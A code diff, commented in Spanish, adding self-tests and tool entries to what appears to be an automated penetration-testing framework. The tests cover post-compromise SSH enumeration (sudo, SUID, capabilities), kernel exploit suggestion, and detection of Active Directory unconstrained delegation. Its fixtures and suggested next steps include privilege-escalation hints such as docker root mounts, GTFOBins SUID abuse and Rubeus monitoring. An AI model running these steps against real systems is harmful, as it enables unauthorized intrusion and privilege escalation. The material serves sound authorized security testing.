+        "id": "root", "groups": "root docker"}
+    assert _split_ssh_enum("") == {}
+    assert _split_ssh_enum("sin marcadores, shell restringida") == {}
+    # _parse_sudo_l: los 3 formatos reales de sudoers que importan (ALL sin contraseña, ALL CON
+    # contraseña ya conocida, y binarios NOPASSWD concretos) + el caso sin ningún privilegio.
+    assert _parse_sudo_l("User op may run the following commands:\n    (ALL) NOPASSWD: ALL") == (True, False, [])
+    assert _parse_sudo_l("User op may run:\n    (ALL : ALL) ALL") == (False, True, [])
+    assert _parse_sudo_l(
+        "User op may run:\n    (root) NOPASSWD: /usr/bin/find, /usr/bin/vim /etc/hosts"
+    ) == (False, False, ["find", "vim"])
+    assert _parse_sudo_l("Sorry, user op may not run sudo on host.") == (False, False, [])
+    assert _parse_sudo_l("") == (False, False, [])
+    # _suid_interesting: la baseline de fábrica no es ruido (passwd/sudo/su…) pero un intérprete
+    # con SUID SÍ es la señal real que esto existe para no perderse.
+    assert _suid_interesting("/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/python3.8\n") == ["/usr/bin/python3.8"]
+    assert _suid_interesting("/usr/bin/passwd\n/bin/su\n") == []
+    assert _suid_interesting("") == []
+    # _parse_caps: cap_setuid/cap_sys_admin+ep son la vía de escalada; cap_net_bind_service (p.
+    # ej. para escuchar en <1024 sin root) es ruido habitual y NO debe generar un hallazgo.
+    assert _parse_caps("/usr/bin/python3.8 = cap_setuid+ep\n") == [("/usr/bin/python3.8", "cap_setuid+ep")]
+    assert _parse_caps("/usr/bin/ping = cap_net_raw+ep\n") == []
+    assert _parse_caps("") == []
+    # Integración de punta a punta: credencial SSH ya validada → _ssh_post_enum detecta grupo
+    # docker (root-equivalente), sudo NOPASSWD: ALL y un SUID fuera de la baseline, todo en UNA
+    # sola conexión (1 solo comando sshpass/ssh, nunca el módulo ssh de nxc — bug de paramiko).
+    _ssh_cmds = []
+    def _fake_ssh_rc(cmd, timeout=None, input_text=None, **kw):
+        _ssh_cmds.append((cmd, input_text))
+        out = ("__PALANTIR_ID__\nuid=1000(op)\n"
+               "__PALANTIR_GROUPS__\nop sudo docker\n"
+               "__PALANTIR_OS__\nUbuntu 22.04\nLinux dc04 5.15.0\n"
+               "__PALANTIR_SUDO__\nUser op may run:\n    (ALL) NOPASSWD: ALL\n"
+               "__PALANTIR_SUID__\n/usr/bin/passwd\n/usr/bin/python3.8\n"
+               "__PALANTIR_SGID__\n\n__PALANTIR_CAPS__\n\n__PALANTIR_CRON__\n")
+        return 0, out
+    _real_have_ssh, _real_rc_ssh = globals()["have"], run_capture
+    globals()["have"] = lambda name: name == "sshpass"
+    globals()["run_capture"] = _fake_ssh_rc
+    try:
+        _ssh_res = _fp("reuse-ssh", "Credenciales aportadas — SSH", [22])
+        _ssh_post_enum(_ssh_res, "10.0.0.1", 22, "op", "Summer2024!")
+    finally:
+        globals()["have"], globals()["run_capture"] = _real_have_ssh, _real_rc_ssh
+    assert len(_ssh_cmds) == 1, _ssh_cmds                              # UNA sola conexión, no una por chequeo
+    _ssh_cmd0, _ssh_in0 = _ssh_cmds[0]
+    assert _ssh_cmd0[0] == "sshpass" and "-f" in _ssh_cmd0, _ssh_cmd0
+    assert "ssh" in _ssh_cmd0 and "op@10.0.0.1" in _ssh_cmd0 and "-p" in _ssh_cmd0 and "22" in _ssh_cmd0, _ssh_cmd0
+    assert "Summer2024!" not in _ssh_cmd0, _ssh_cmd0                   # la contraseña NUNCA va por argv
+    assert _ssh_in0 == "Summer2024!\n", _ssh_in0                       # … va por stdin (sudo -S la lee de ahí)
+    assert any(s == "critica" and "docker" in t for s, t in _ssh_res["findings"]), _ssh_res["findings"]
+    assert any(s == "critica" and "NOPASSWD: ALL" in t for s, t in _ssh_res["findings"]), _ssh_res["findings"]
+    assert any(s == "alta" and "python3.8" in t for s, t in _ssh_res["findings"]), _ssh_res["findings"]
+    assert any("docker run -v /:/mnt" in n for n in _ssh_res["next"]), _ssh_res["next"]
+    assert any("gtfobins.github.io/gtfobins/python3.8/#suid" in n for n in _ssh_res["next"]), _ssh_res["next"]
+    # La salida CRUDA del paso enmascara la contraseña (no aplica aquí, no aparece en la salida
+    # remota) pero el paso SÍ se registra como OK (hubo secciones reconocibles).
+    assert _ssh_res["steps"][0]["ok"] is True, _ssh_res["steps"][0]
+    # sshpass ausente: no se intenta nada por red, se deja el comando manual + 'missing'.
+    globals()["have"] = lambda name: False
+    try:
+        _ssh_nores = _fp("reuse-ssh", "Credenciales aportadas — SSH", [22])
+        _ssh_post_enum(_ssh_nores, "10.0.0.1", 22, "op", "x")
+    finally:
+        globals()["have"] = _real_have_ssh
+    assert "sshpass" in _ssh_nores["missing"], _ssh_nores["missing"]
+    assert any("ssh op@10.0.0.1" in n for n in _ssh_nores["next"]), _ssh_nores["next"]
+    # Shell restringida/rbash: ningún marcador reconocible → hallazgo 'info', no un falso "sin sudo".
+    globals()["have"] = lambda name: name == "sshpass"
+    globals()["run_capture"] = lambda cmd, timeout=None, input_text=None, **kw: (0, "rbash: comando no permitido")
+    try:
+        _ssh_rbash = _fp("reuse-ssh", "Credenciales aportadas — SSH", [22])
+        _ssh_post_enum(_ssh_rbash, "10.0.0.1", 22, "op", "x")
+    finally:
+        globals()["have"], globals()["run_capture"] = _real_have_ssh, _real_rc_ssh
+    assert any(s == "info" and "shell restringida" in t for s, t in _ssh_rbash["findings"]), _ssh_rbash["findings"]
+
+    # ── Linux: versión de kernel/sudo/polkit (dato que nmap NUNCA ve) → linux-exploit-suggester
+    # EN LOCAL (nunca contra el objetivo) + el MISMO searchsploit offline de la Fase 5b ──────────
+    assert _parse_os_versions(
+        "PRETTY_NAME=\"Ubuntu 20.04\"\nVERSION_ID=\"20.04\"\n\nLinux dc04 5.4.0-96-generic #108 x86_64\n\n"
+        "5.4.0-96-generic\n\nSudo version 1.8.31\n\npkexec version 0.105\n") == ("5.4.0-96-generic", "1.8.31", "0.105")
+    assert _parse_os_versions("") == (None, None, None)
+    assert _parse_os_versions("Sudo version 1.9.5p2\n") == (None, "1.9.5p2", None)
+    # Vía dpkg (sin pkexec en PATH): 'Version: X' también cuenta.
+    assert _parse_os_versions("Version: 0.105-26ubuntu1.3\n")[2] == "0.105-26ubuntu1.3"
+    # _parse_les: formato REAL confirmado en el código fuente de linux-exploit-suggester.sh (el
+    # bucle final que imprime cada entrada: '[+] [CVE-x] nombre' + '   Exposure: <nivel>').
+    _les_sample = (
+        "\n[+] [CVE-2022-0847] Dirty Pipe\n\n   Details: https://dirtypipe.cm4all.com/\n"
+        "   Exposure: highly probable\n   Tags: ubuntu=20.04|21.04\n"
+        "   Download URL: https://www.exploit-db.com/download/50808\n"
+        "[+] [CVE-2009-1185] udev Netlink\n\n   Details: http://x\n"
+        "   Exposure: less probable\n   Download URL: https://www.exploit-db.com/download/8572\n")
+    _les_hits = _parse_les(_les_sample)
+    assert _les_hits == [("CVE-2022-0847", "Dirty Pipe", "highly probable"),
+                          ("CVE-2009-1185", "udev Netlink", "less probable")], _les_hits
+    assert _parse_les("") == []
+    assert _parse_les("sin coincidencias, kernel limpio") == []
+    # _kernel_exploit_suggest: EN LOCAL (nunca toca la red/el objetivo) — se ejecuta 1 sola vez
+    # con '-k <versión>' y el hallazgo 'highly probable' sale en 'critica'.
+    _les_cmds = []
+    def _fake_les_rc(cmd, timeout=None, **kw):
+        _les_cmds.append(cmd)
+        return 0, _les_sample
+    _real_have_les, _real_rc_les = globals()["have"], run_capture
+    globals()["have"] = lambda name: name in ("les.sh",)
+    globals()["run_capture"] = _fake_les_rc
+    try:
+        _les_res = _fp("reuse-ssh", "x", [22])
+        _kernel_exploit_suggest(_les_res, "5.4.0-96-generic")
+    finally:
+        globals()["have"], globals()["run_capture"] = _real_have_les, _real_rc_les
+    assert len(_les_cmds) == 1 and _les_cmds[0][-2:] == ["-k", "5.4.0-96-generic"], _les_cmds
+    assert any(s == "critica" and "CVE-2022-0847" in t for s, t in _les_res["findings"]), _les_res["findings"]
+    assert any("CVE-2009-1185" not in t for s, t in _les_res["findings"])   # 'less probable' no se lista arriba
+    assert any("-f" in n for n in _les_res["next"]), _les_res["next"]
+    # linux-exploit-suggester ausente: se deja constancia en 'missing', sin tocar la red.
+    globals()["have"] = lambda name: False
+    try:
+        _les_nores = _fp("reuse-ssh", "x", [22])
+        _kernel_exploit_suggest(_les_nores, "5.4.0")
+    finally:
+        globals()["have"] = _real_have_les
+    assert "linux-exploit-suggester" in _les_nores["missing"], _les_nores["missing"]
+    # Todo 'less probable': se anota como ruido histórico (info), no se oculta sin más.
+    globals()["have"] = lambda name: name in ("les.sh",)
+    globals()["run_capture"] = lambda cmd, timeout=None, **kw: (0,
+        "[+] [CVE-2009-1185] udev Netlink\n\n   Details: http://x\n   Exposure: less probable\n"
+        "   Download URL: https://www.exploit-db.com/download/8572\n")
+    try:
+        _les_lp = _fp("reuse-ssh", "x", [22])
+        _kernel_exploit_suggest(_les_lp, "6.8.0")
+    finally:
+        globals()["have"], globals()["run_capture"] = _real_have_les, _real_rc_les
+    assert any(s == "info" and "less probable" in t for s, t in _les_lp["findings"]), _les_lp["findings"]
 
     # #41: fp_imap_pop3 construye los next-steps desde los puertos REALES (no un IMAPS:993 fijo).
     _real_gb41 = globals().get("grab_banner")
@@ -15898,8 +16474,11 @@ def selftest():
         if cmd[0] == "FAKE_SECRETSDUMP":
             return 0, ""
         if cmd[0] == "ldapsearch":
-            if "userAccountControl=4128" in " ".join(cmd):
+            joined = " ".join(cmd)
+            if "userAccountControl=4128" in joined:
                 return 0, "dn: CN=LEGACY01,CN=Computers,DC=child,DC=corp,DC=local\nsAMAccountName: LEGACY01$\n\n"
+            if "1.4.803:=524288" in joined:
+                return 0, "dn: CN=FILE01,CN=Computers,DC=child,DC=corp,DC=local\nsAMAccountName: FILE01$\n\n"
             return 0, ""   # trustedDomain: vacío, sin trusts en este fixture
         if "-M" in cmd and "maq" in cmd:
             return 0, "LDAP 10.0.0.1 389 DC01 [+] MachineAccountQuota: 0"
@@ -15920,12 +16499,18 @@ def selftest():
     assert any(s == "alta" and "pre-creada" in t and "LEGACY01$" in t for s, t in _p2find["findings"])
     assert any("-M pre2k" in n and "1 cuenta" in n for n in _p2find["next"])
     assert any("Password123" in n for n in _p2find["next"])   # dacledit.py la lleva en la URL, en claro por defecto
+    # Delegación sin restricciones: mismo fixture, misma pasada — FILE01$ (NO DC) con el flag.
+    assert any(s == "critica" and "delegación SIN RESTRICCIONES" in t and "FILE01$" in t for s, t in _p2find["findings"])
+    assert any("Rubeus.exe monitor" in n for n in _p2find["next"])
 
     # _parse_ldap_pre2k en frío (sin red): [] si no hay ningún bloque con sAMAccountName.
     assert _parse_ldap_pre2k("dn: CN=x,DC=y\ntrustPartner: z\n\n") == []
     assert _parse_ldap_pre2k("") == []
     assert _parse_ldap_pre2k(
         "dn: CN=A\nsAMAccountName: A$\n\ndn: CN=B\nsAMAccountName: B$\n\n") == ["A$", "B$"]
+    # _parse_unconstrained_delegation: mismo parseo LDIF, filtro YA excluye los DC (primaryGroupID=516).
+    assert _parse_unconstrained_delegation("dn: CN=FILE01\nsAMAccountName: FILE01$\n\n") == ["FILE01$"]
+    assert _parse_unconstrained_delegation("") == []
 
     # Sin dominio conocido todavía (domain=None, el caso normal: Fase 5d corre antes de
     # discover_domains()): certipy NO se ejecuta a ciegas con un dominio adivinado — se
@@ -18993,6 +19578,8 @@ TOOL_PKGS = {
     "certipy":          (None, "AD CS: enumera plantillas de certificados vulnerables (ESC1-8) con una credencial de dominio ya validada — Fase 5d (no está en apt → pip/pipx install certipy-ad)", ("creds",)),
     "creds":            (None, "Web: credenciales por defecto de productos fingerprintados por whatweb (Jenkins/Grafana/Tomcat…) — consulta local (no está en apt → pipx install defaultcreds-cheat-sheet)", ("foot",)),
     "hydra":            ("hydra", "Fuerza bruta de LISTAS (-U/-P) en SSH/FTP/SMB — Fase 5d (más rápido que nxc y sin su bug de paramiko por SSH)", ("foot",)),
+    "sshpass":          ("sshpass", "SSH: con una credencial ya validada, enumera sudo -l/SUID/SGID/capabilities/cron de solo lectura (equivalente al primer barrido de linPEAS) — Fase 5c/5d, nunca el módulo ssh de nxc (bug de paramiko)", ("creds",)),
+    "linux-exploit-suggester": (None, "SSH: cruza el kernel real (uname -r, Fase 5c/5d) con una base curada de CVEs de privesc EN LOCAL, nunca contra el objetivo (no está en apt → github.com/mzet-/linux-exploit-suggester)", ("creds",)),
     "brutespray":       (None, "Fuerza bruta de LISTAS (-U/-P) en telnet/pop3/imap/redis/snmp/smtp — Fase 5d (únicos protocolos sin módulo nxc/hydra propio; no está en apt → github.com/x90skysn3k/brutespray)", ("creds",)),
     "kerbrute":         (None, "AD: enum de usuarios + password spray por Kerberos pre-auth contra un DC (rápido/silencioso; no está en apt → github.com/ropnop/kerbrute)", ("foot",)),
     "smtp-user-enum":   ("smtp-user-enum", "SMTP: enum de usuarios por RCPT con --aggressive si hay dominio (VRFY/EXPN suelen estar capados)", ("foot",)),
